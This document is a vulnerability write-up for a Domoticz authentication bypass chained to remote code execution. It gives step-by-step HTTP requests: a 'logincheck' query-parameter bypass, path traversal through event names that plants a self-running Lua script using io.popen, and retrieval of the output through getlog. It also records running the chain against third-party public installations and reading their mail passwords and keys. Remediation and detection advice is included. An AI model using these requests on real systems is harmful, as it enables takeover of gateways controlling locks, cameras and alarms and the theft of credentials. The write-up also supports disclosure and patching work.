# Domoticz Authentication Bypass Leading to Remote Code Execution

[简体中文](README.zh-CN.md) · [Translated HTTP PoC](POC.md) · [Translated reproduction script](repro.py)

Public targets in this version are represented by `.invalid` hostnames. The request and response details remain as recorded in the source report.

Vulnerability discovery date: 2026-10-22  
Technical vulnerability type: Remote code execution (RCE)

## Vulnerability description

Domoticz is an open-source home automation and IoT gateway system written in C++. It runs on Linux, Windows, Raspberry Pi, and Docker. Its Web interface and `/json.htm` JSON API centrally manage lights, switches, sensors, security panels, and hardware such as Z-Wave, Zigbee, MQTT, and cameras. Its source is hosted at [domoticz/domoticz](https://github.com/domoticz/domoticz). Many instances are directly exposed to the public Internet.

When deciding whether a command is exempt from login, the built-in `libwebem` reads a substring of the raw URI, while command dispatch uses the parsed parameters. Placing `x=?param=logincheck` as the first query parameter allows an anonymous caller to invoke arbitrary JSON commands. In version 2026.3 and earlier, the `events` command lacks a permission check, and event names do not filter `../`. A Lua script can therefore be written by path traversal into `scripts/lua`. The classic Lua engine periodically executes `.lua` files whose names contain `_time_`; `luaL_openlibs` makes `os` and `io` available. An attacker can thus execute arbitrary system commands on the target server, with output returned through `getlog` after `print` redirects it to the server log.

## Impact

An attacker needs no account to bypass Domoticz login and directly invoke management interfaces. The attacker can read notification-account passwords, push-service keys, security-panel password hashes, and trusted network ranges from the gateway configuration, and execute arbitrary system commands on the host. This can give the attacker full control of a home or building automation system. Because Domoticz often manages lighting, door locks, cameras, and security panels, a successful attack could operate locks, view surveillance feeds, alter alarms and arming states, and use the gateway to reach other devices on the same internal network. Such IoT gateways are often online for long periods and rarely upgraded, so the risk persists when they are exposed to the public Internet.

Vendor: Domoticz open-source project ([GitHub](https://github.com/domoticz/domoticz)).

## Known affected product and versions

Product: Domoticz home automation system ([source repository](https://github.com/domoticz/domoticz)). Affected versions: **2026.3 and earlier**, including 2026.1 and 2026.2. Stable Release 2026.3 was published on 2026-08-02. Source review identified the raw-URI-substring check for the login-exempt command list in `main/WebServer.cpp:577-580`.

Fixed version: **2026.4**, published on 2026-10-01. It matches login-exempt commands against parsed parameters, restricts `events` and `getsettings` to administrators, and no longer returns credentials from `gethardware`. The latest-version evidence cited in the source report is [Stable Release 2026.4](https://github.com/domoticz/domoticz/releases/tag/2026.4), dated 2026-10-01.

## Internet asset evidence

1. Exact asset-search syntax: `title="Domoticz"`.
2. The source report states that the asset-search platform returned at least 10 matching, valid, distinct IP addresses.
3. The source report contains an asset-search screenshot. Screenshots are omitted from this repository because they identify third-party installations, and other images in the source package expose credentials.

## 1. Technical details

### 1.1 Complete PoC description

1. A control request without the bypass marker returns `401`, showing that authentication is enabled on the target:

   ```http
   GET /json.htm?type=command&param=getsettings HTTP/1.1
   Host: site-b.invalid:9443

   HTTP/1.1 401
   Content-Length: 91
   ```

2. With the bypass marker in the first query parameter, the same command returns `200` and the full configuration (the displayed field values are masked):

   ```http
   GET /json.htm?x=?param=logincheck&type=command&param=getsettings HTTP/1.1
   Host: site-b.invalid:9443
   User-Agent: Mozilla/5.0
   Connection: close

   HTTP/1.1 200
   Content-Type: application/json
   Content-Length: 3972

   {"status":"OK","title":"settings","EmailUsername":"a2***9t","EmailPassword":"aW***==","EmailServer":"sm***om","EmailPort":"4**","EmailFrom":"kl***om","SecPassword":"d4***7e","ProtectionPassword":"d4***7e","WebLocalNetworks":"12***.*"}
   ```

3. Changing `param` to `events` and using `evparam=create`, with `../` in the event name, writes across the directory boundary into `scripts/lua`:

   ```http
   GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=create&name=../../lua/ncc_time_7a7b1a&interpreter=dzVents&eventtype=All&eventstatus=1&xml=<URL-encoded Lua containing io.popen('echo NCCPROBE'), then print, then os.remove of itself> HTTP/1.1
   Host: site-a.invalid
   User-Agent: Mozilla/5.0
   Connection: close

   HTTP/1.1 200
   Content-Type: application/json

   {"status":"OK","title":"AddEvent"}
   ```

4. Listing events confirms that the event was stored and that its name retained the traversal path:

   ```http
   GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=list HTTP/1.1
   Host: site-a.invalid
   User-Agent: Mozilla/5.0
   Connection: close

   HTTP/1.1 200

   {"status":"OK","title":"events","result":[{"id":"23","name":"../../lua/ncc_time_7a7b1a","eventstatus":"1"}]}
   ```

5. The Lua time script runs `echo`; `print` writes its output into the server log, which `getlog` returns:

   ```http
   GET /json.htm?x=?param=logincheck&type=command&param=getlog&loglevel=268435455 HTTP/1.1
   Host: site-a.invalid
   User-Agent: Mozilla/5.0
   Connection: close

   HTTP/1.1 200
   Content-Length: 44536

   2026-10-20 12:12:00.379  Status: LUA: NCCPROBE
   2026-10-20 12:12:00.383  Status: LUA: NCCPROBE_CLEAN true nil
   ```

6. After deleting the event and checking again, the list no longer contained `ncc_time_7a7b1a`:

   ```http
   GET /json.htm?x=?param=logincheck&type=command&param=events&evparam=delete&event=23&id=23 HTTP/1.1
   Host: site-a.invalid
   User-Agent: Mozilla/5.0
   Connection: close

   HTTP/1.1 200 (the server performed the operation, but reading the response timed out)
   ```

   A subsequent `GET ...evparam=list` returned `HTTP/1.1 200`, with 16 events and no matching entry.

7. Source locations in 2026.3: `main/WebServer.cpp:577-580` registers `getsettings`, `gethardware`, and `events` without `minRights`; `Cmd_GetSettings` and `Cmd_GetHardware` in `main/WebServerCmds.cpp` do not check `session.rights`; `Cmd_Events` at `main/EventSystem.cpp:4326` has no permission check. The `create` branch at `:4477-4577` calls `LoadEvents`; `:309-316` writes a file using `dzv_Dir + Name + ".lua"`; `:1717-1755` executes matching `*_time_*.lua` files in `scripts/lua`; and `EvaluateLuaClassic` at `:2808-2813` calls `luaL_openlibs` and redirects `print`. Version 2026.4 changes the login-exempt list to exact matching of parsed parameters, restricts `events` to administrators, and sanitizes event names.

The complete original HTTP record is translated in [POC.md](POC.md).

### 1.2 Trigger conditions

The target runs Domoticz 2026.3 or earlier and its Web/JSON port is reachable. No account, Cookie, or token is required. The bypass marker `x=?param=logincheck` must be the first query parameter; its `?` and `=` characters must remain literal. From version 2026.4, the same request returns `401` or `403`.

## 2. Reproduction evidence

### White-box case

#### 2.1 Basic environment

The white-box environment used source from the Domoticz 2026.3 tag on Linux, with the built-in `libwebem` and SQLite `domoticz.db`. Source from 2026.4 and `libwebem` 1.31.0 served as the fixed-version comparison. Online targets were directly exposed 2026.3 instances.

#### 2.2 Steps

1. Obtain the 2026.3 tag source. Inspect the command registrations at `main/WebServer.cpp:577-580` and confirm that `getsettings`, `gethardware`, and `events` have no `minRights` argument.
2. Inspect `Cmd_GetSettings` and `Cmd_GetHardware` in `main/WebServerCmds.cpp`, and `Cmd_Events` at `main/EventSystem.cpp:4326`; confirm that these functions do not test `session.rights`.
3. Inspect `main/EventSystem.cpp:4477-4577`: `evparam=create` performs an `INSERT` and calls `LoadEvents()`. At `:309-316`, the path is assembled from `dzv_Dir + eitem.Name + ".lua"`, without filtering `../` from `Name`.
4. Inspect `main/EventSystem.cpp:1717-1755`: `DirectoryListing` scans `scripts/lua` and calls `EvaluateLua` for `.lua` filenames containing `_time_`. At `:2808-2813`, `EvaluateLuaClassic` calls `luaL_openlibs`, making `os` and `io` available, and redirects `print` to the log.
5. Start an authenticated 2026.3 instance. Anonymous access to `/json.htm?type=command&param=getsettings` returns `401`; adding `x=?param=logincheck` as the first parameter returns `200` and the settings JSON.
6. On a self-hosted instance, create the `ncc_time_*` event as in steps 3–5 above, read `getlog` to confirm the `NCCPROBE` output, delete the event, and confirm that `os.remove` removed the script from `scripts/lua`.

#### 2.3 Reproduction precautions

The default mode is read-only (`getsettings` and `gethardware`). The source report says a harmless probe runs only with `--rce`: it executes only `echo NCCPROBE`, then the script removes itself with `os.remove`; the event is subsequently deleted using `evparam=delete` and the result is checked. The report discloses the side effects: `create` and `delete` cause `LoadEvents()` to rebuild the `generated_scripts` directory as part of the product's normal save process, and two `LUA: NCCPROBE*` lines remain in the target log (the log is read-only and cannot be deleted remotely). Per site, the described sequence uses at most one `create`, one `list`, one `getlog`, and one `delete`. It stops once the result is obtained, does not read `domoticz.db`, and does not modify devices, scenes, hardware, users, or configuration. The report states that credentials in the report and script output were masked. The bundled script actually uses `-c`/`--cmd` in place of `--rce`; this public copy also fixes its original no-op masking functions.

### Black-box cases

1. **site-d.invalid:** authentication bypass → Lua event → command output.
2. **site-b.invalid:9443:** the same bypass anonymously read SMTP credentials.
3. **site-c.invalid:10443:** anonymous reading of hardware account credentials.

The three screenshots for these cases are omitted from this repository because they visibly contain unmasked third-party passwords, account identifiers, hashes, and network details.

Other affected targets listed in the source report:

- `site-e.invalid:7443`: `200` with `EmailUsername`, `EmailPassword`, and `EmailServer` (3,922 bytes).
- `site-f.invalid:4443`: `200` with SMTP credentials and hardware `Username`/`Password` (3,318/3,937 bytes).
- `site-a.invalid`: `200` with `EmailUsername`, `EmailPassword`, and `WebLocalNetworks` (3,436 bytes).
- `site-g.invalid:4443`: `200` with `ProwlAPI` and SMTP credentials (4,196 bytes).
- `site-h.invalid:9443`: `200` with `PushbulletAPI` and `SecPassword` (4,153 bytes).
- `site-i.invalid:9443`: `200` with `SecPassword` and hardware `Username`/`Password` (4,104/1,217 bytes).
- `site-j.invalid:2222`: `200` with SMTP credentials and a hardware address (3,921/7,099 bytes).

## 3. Remediation

**Permanent fix:** Upgrade to [Domoticz 2026.4](https://github.com/domoticz/domoticz/releases/tag/2026.4). That release matches login-exempt commands against parsed parameters, restricts `events` and `getsettings` to administrators, prevents `gethardware` from returning usernames, passwords, addresses, and ports to non-administrators, and prevents event names from writing outside `generated_scripts`.

**Temporary measure 1:** Require authentication for `/json.htm` at the reverse proxy or WAF, reject requests whose query string contains `param=logincheck`, and block anonymous access to `events`, `getsettings`, and `gethardware`. Do not expose the Web port directly to the public Internet.

**Temporary measure 2:** Check the `EventMaster` table and `scripts/lua` directory. Remove events whose names contain `../` or `ncctime`, unknown events, and unknown `*_time_*.lua` scripts. Rotate exposed SMTP passwords, push-service keys, and hardware-account passwords, and reset security-panel PINs.

**Detection:** Audit Web logs for `x=?param=logincheck`, `evparam=create`, and anonymous `getlog` access to determine whether the issue has been exploited.

## 4. Notes

**Duplicate check reported by the source:** As of 2026-10-20, Domoticz entries in NVD concerned older SQL injection, CRLF, stored XSS, buffer overflow, and third-party gateway information disclosure; none covered the `logincheck` authentication bypass or `events` path traversal into Lua. The source report states that an OSV query for Domoticz returned no result; Exploit-DB listed only a 2019 older RCE (EDB-46773) and another older entry; no reproduction or PoC for this bypass appeared in repository issues or pull requests; Seebug contained one older 2017 report; and CNVD/CNNVD had no matching identifier. It describes this issue as a significant one-day vulnerability without a public PoC.

**Fix status:** Domoticz 2026.4 had been published as a stable release, with a GitHub 2026.4 tag and a Fedora `domoticz-2026.4-1` package described as a new stable release on 2026-10-01. Version 2026.3, published on 2026-08-02, was the reproduction baseline. The 2026.4 `History.txt` security section lists the fixes relevant to this report: login-exempt commands are checked using parsed parameters, `events` and `getsettings` are administrator-only, and `gethardware` no longer returns credentials.

**Public disclosure scope:** The vendor's release notes summarize the defect categories and impact: the mismatch between raw URL and parsed parameters; low-privilege users being able to create and run events; and disclosure of SMTP/push-service keys and PIN hashes through `getsettings`. They did not include the parameter form, example requests, or an exploit script, and did not assign a CVE.
